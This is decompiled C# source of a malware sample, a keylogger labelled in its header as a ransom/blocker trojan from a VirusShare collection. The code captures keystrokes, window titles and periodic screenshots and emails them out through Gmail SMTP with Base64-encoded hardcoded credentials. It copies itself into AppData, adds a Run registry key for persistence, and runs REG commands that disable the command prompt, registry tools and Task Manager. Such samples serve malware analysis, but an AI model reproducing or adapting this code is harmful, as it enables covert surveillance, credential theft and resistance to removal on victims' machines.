// Decompiled with JetBrains decompiler
// Type: cUsIBkSVpSWkuQd
// Assembly: OMFG 53M loot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DB9BDDA4-2EB8-412B-9952-C4111F8016FB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-54eaff1876ba3c2ba296532fad15ed03d78f1408.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using My;
using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

[StandardModule]
internal sealed class cUsIBkSVpSWkuQd
{
  private static string QDezybJaMQpQbVn = "Ym9vbWdvb2RnYW1lQGdtYWlsLmNvbQ==";
  private static string kIdCtqCThDqzYSv = "bG9sbG9sMTk5Ng==";
  private static string xeyEMChqqpuRYfK = "smtp.gmail.com";
  private static int WWmpskJYRBilGim = 587;
  private static string iHWPyhjEglyJerf;
  private static string RsPOpXoaeFfqkDz;
  private static string WrRJFQhwSFPmhLN;
  private static string sNTbQvFGEJgmtYl;
  private static string kBFHyYnfQxzUwCP;
  private static string vlRaaYdPIPtGGVZ;
  private static int grlEnKtFLHSjxGH = 300000;
  private static string zWiwevhlMzxrJHd = (string) null;
  private static object BxgtTTuDPrLqPgG = (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static string RojMOuBUcSxstrw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
  private static MailMessage hovMnmDsumMoTRz = new MailMessage();
  private static SmtpClient FkUQFZPGUeNNzmN = new SmtpClient();
  [AccessedThroughProperty("kUQFZPGUeNNzmNj")]
  private static jwLsKvzZOLFXUqN _kUQFZPGUeNNzmNj;
  private static object CORfBDMWRuKcwQK;
  private static RichTextBox OrWGCqLCsGQyymY;

  static cUsIBkSVpSWkuQd()
  {
    cUsIBkSVpSWkuQd.kUQFZPGUeNNzmNj = new jwLsKvzZOLFXUqN();
    cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK = (object) Path.GetFileName(Application.ExecutablePath);
    cUsIBkSVpSWkuQd.OrWGCqLCsGQyymY = new RichTextBox();
  }

  private static jwLsKvzZOLFXUqN kUQFZPGUeNNzmNj
  {
    get => cUsIBkSVpSWkuQd._kUQFZPGUeNNzmNj;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      if (cUsIBkSVpSWkuQd._kUQFZPGUeNNzmNj != null)
        jwLsKvzZOLFXUqN.KeyDown -= new jwLsKvzZOLFXUqN.KeyDownEventHandler(cUsIBkSVpSWkuQd.ZcUsIBkSVpSWkuQ);
      cUsIBkSVpSWkuQd._kUQFZPGUeNNzmNj = value;
      if (cUsIBkSVpSWkuQd._kUQFZPGUeNNzmNj == null)
        return;
      jwLsKvzZOLFXUqN.KeyDown += new jwLsKvzZOLFXUqN.KeyDownEventHandler(cUsIBkSVpSWkuQd.ZcUsIBkSVpSWkuQ);
    }
  }

  [DllImport("user32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int GetForegroundWindow();

  [DllImport("user32.dll", EntryPoint = "GetWindowTextA", CharSet = CharSet.Ansi, SetLastError = true)]
  private static extern int fwJwuoHEaKVbXiz(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

  [STAThread]
  public static void main()
  {
    cUsIBkSVpSWkuQd.vlRaaYdPIPtGGVZ = Conversions.ToString(true);
    cUsIBkSVpSWkuQd.WrRJFQhwSFPmhLN = Conversions.ToString(true);
    cUsIBkSVpSWkuQd.sNTbQvFGEJgmtYl = Conversions.ToString(false);
    cUsIBkSVpSWkuQd.kBFHyYnfQxzUwCP = Conversions.ToString(false);
    cUsIBkSVpSWkuQd.RsPOpXoaeFfqkDz = Conversions.ToString(true);
    cUsIBkSVpSWkuQd.iHWPyhjEglyJerf = Conversions.ToString(true);
    if (!Operators.ConditionalCompareObjectEqual((object) Application.StartupPath, cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, false))
    {
      using (System.IO.File.Create(Conversions.ToString(Operators.ConcatenateObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\ovMnmDsumMoTRzn.txt"))))
        ;
      StreamWriter streamWriter = new StreamWriter(cUsIBkSVpSWkuQd.RojMOuBUcSxstrw + "\\ovMnmDsumMoTRzn.txt");
      streamWriter.Write(Application.ExecutablePath);
      streamWriter.Flush();
      streamWriter.Close();
      if (System.IO.File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK))))
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK)));
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK)));
      }
      else
        MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, Conversions.ToString(Operators.AddObject(Operators.AddObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK)));
      NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
      {
        Operators.AddObject(Operators.AddObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK)
      }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      ProjectData.EndApp();
    }
    if (Conversions.ToBoolean(cUsIBkSVpSWkuQd.iHWPyhjEglyJerf) && RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).GetValue(Conversions.ToString(cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK))) == null)
      MyProject.Computer.Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK), Operators.ConcatenateObject(Operators.ConcatenateObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), cUsIBkSVpSWkuQd.CORfBDMWRuKcwQK));
    if (Conversions.ToBoolean(cUsIBkSVpSWkuQd.RsPOpXoaeFfqkDz))
    {
      try
      {
        MyProject.Computer.FileSystem.DeleteFile(Conversions.ToString((object) MyProject.Computer.FileSystem.ReadAllText(Conversions.ToString(Operators.ConcatenateObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\ovMnmDsumMoTRzn.txt")))));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    if (Conversions.ToBoolean(cUsIBkSVpSWkuQd.WrRJFQhwSFPmhLN))
      Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(cUsIBkSVpSWkuQd.sNTbQvFGEJgmtYl))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    if (Conversions.ToBoolean(cUsIBkSVpSWkuQd.kBFHyYnfQxzUwCP))
      Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", AppWinStyle.NormalFocus);
    System.Windows.Forms.Timer timer1 = new System.Windows.Forms.Timer();
    timer1.Interval = 300000;
    timer1.Tick += new EventHandler(cUsIBkSVpSWkuQd.wLsKvzZOLFXUqNl_Ticked);
    timer1.Start();
    System.Windows.Forms.Timer timer2 = new System.Windows.Forms.Timer();
    timer2.Interval = 300;
    timer2.Tick += new EventHandler(cUsIBkSVpSWkuQd.rnyDRmoxHCfvOiC_Ticked);
    timer2.Start();
    cUsIBkSVpSWkuQd.kUQFZPGUeNNzmNj.lrnyDRmoxHCfvOi();
    Application.Run();
  }

  private static string BWXhFlPeLSksiOJ()
  {
    string lpString = new string(char.MinValue, 100);
    cUsIBkSVpSWkuQd.fwJwuoHEaKVbXiz(cUsIBkSVpSWkuQd.GetForegroundWindow(), ref lpString, 100);
    return lpString.Substring(0, checked (Strings.InStr(lpString, "\0") - 1));
  }

  public static string dQDezybJaMQpQbV(string vJIYceWvLDnVXrU) => Encoding.ASCII.GetString(Convert.FromBase64String(vJIYceWvLDnVXrU));

  public static void wLsKvzZOLFXUqNl_Ticked(object sender, EventArgs e)
  {
    if (Conversions.ToBoolean(cUsIBkSVpSWkuQd.vlRaaYdPIPtGGVZ))
    {
      Size blockRegionSize = new Size(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Bitmap bitmap = new Bitmap(MyProject.Computer.Screen.Bounds.Width, MyProject.Computer.Screen.Bounds.Height);
      Graphics.FromImage((Image) bitmap).CopyFromScreen(new Point(0, 0), new Point(0, 0), blockRegionSize);
      string Right = cUsIBkSVpSWkuQd.UnhXDMNLQBtBfsr(6);
      bitmap.Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), (object) Right), (object) ".jpeg")));
      try
      {
        MailMessage message = new MailMessage();
        Attachment attachment = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(cUsIBkSVpSWkuQd.BxgtTTuDPrLqPgG, (object) "\\"), (object) Right), (object) ".jpeg")));
        message.From = new MailAddress(cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.QDezybJaMQpQbVn));
        message.To.Add(cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.QDezybJaMQpQbVn));
        message.Subject = "COOLogger Logs From - " + Environment.UserName;
        message.Body = cUsIBkSVpSWkuQd.OrWGCqLCsGQyymY.Text;
        message.Attachments.Add(attachment);
        SmtpClient smtpClient = new SmtpClient("smtp.gmail.com")
        {
          Port = 587,
          EnableSsl = true,
          Credentials = (ICredentialsByHost) new NetworkCredential(cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.QDezybJaMQpQbVn), cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.kIdCtqCThDqzYSv))
        };
        smtpClient.EnableSsl = true;
        smtpClient.Send(message);
        cUsIBkSVpSWkuQd.OrWGCqLCsGQyymY.Text = "";
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
    else
    {
      MailMessage hovMnmDsumMoTrz = cUsIBkSVpSWkuQd.hovMnmDsumMoTRz;
      hovMnmDsumMoTrz.From = new MailAddress(cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.QDezybJaMQpQbVn));
      hovMnmDsumMoTrz.To.Add(cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.QDezybJaMQpQbVn));
      hovMnmDsumMoTrz.Subject = "COOLogger Logs from - " + Environment.UserName;
      hovMnmDsumMoTrz.Body = cUsIBkSVpSWkuQd.OrWGCqLCsGQyymY.Text;
      SmtpClient fkUqfzpgUeNnzmN = cUsIBkSVpSWkuQd.FkUQFZPGUeNNzmN;
      fkUqfzpgUeNnzmN.Host = "smtp.gmail.com";
      fkUqfzpgUeNnzmN.Port = 587;
      fkUqfzpgUeNnzmN.EnableSsl = true;
      fkUqfzpgUeNnzmN.Credentials = (ICredentialsByHost) new NetworkCredential(cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.QDezybJaMQpQbVn), cUsIBkSVpSWkuQd.dQDezybJaMQpQbV(cUsIBkSVpSWkuQd.kIdCtqCThDqzYSv));
      fkUqfzpgUeNnzmN.Send(cUsIBkSVpSWkuQd.hovMnmDsumMoTRz);
      cUsIBkSVpSWkuQd.OrWGCqLCsGQyymY.Text = "";
    }
  }

  public static void ZcUsIBkSVpSWkuQ(Keys e) => cUsIBkSVpSWkuQd.OrWGCqLCsGQyymY.Text += cUsIBkSVpSWkuQd.kUQFZPGUeNNzmNj.CvlRaaYdPIPtGGV(e);

  public static void rnyDRmoxHCfvOiC_Ticked(object sender, EventArgs e)
  {
    if (Operators.CompareString(cUsIBkSVpSWkuQd.zWiwevhlMzxrJHd, cUsIBkSVpSWkuQd.BWXhFlPeLSksiOJ(), false) == 0)
      return;
    cUsIBkSVpSWkuQd.zWiwevhlMzxrJHd = cUsIBkSVpSWkuQd.BWXhFlPeLSksiOJ();
    if (Operators.CompareString(cUsIBkSVpSWkuQd.zWiwevhlMzxrJHd, "", false) == 0)
      return;
    RichTextBox orWgCqLcsGqyymY = cUsIBkSVpSWkuQd.OrWGCqLCsGQyymY;
    orWgCqLcsGqyymY.Text = orWgCqLcsGqyymY.Text + "\r\n\r\n~~~~~" + cUsIBkSVpSWkuQd.zWiwevhlMzxrJHd + " (" + DateAndTime.Now.ToLongTimeString() + ")~~~~~\r\n";
  }

  public static string UnhXDMNLQBtBfsr(int lenght)
  {
    VBMath.Randomize();
    StringBuilder stringBuilder = new StringBuilder("");
    char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
    int num1 = lenght;
    int num2 = 1;
    while (num2 <= num1)
    {
      VBMath.Randomize();
      int index = checked ((int) Math.Round((double) unchecked (Conversion.Int((float) checked (charArray.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f)));
      stringBuilder.Append(charArray[index]);
      checked { ++num2; }
    }
    return stringBuilder.ToString();
  }
}
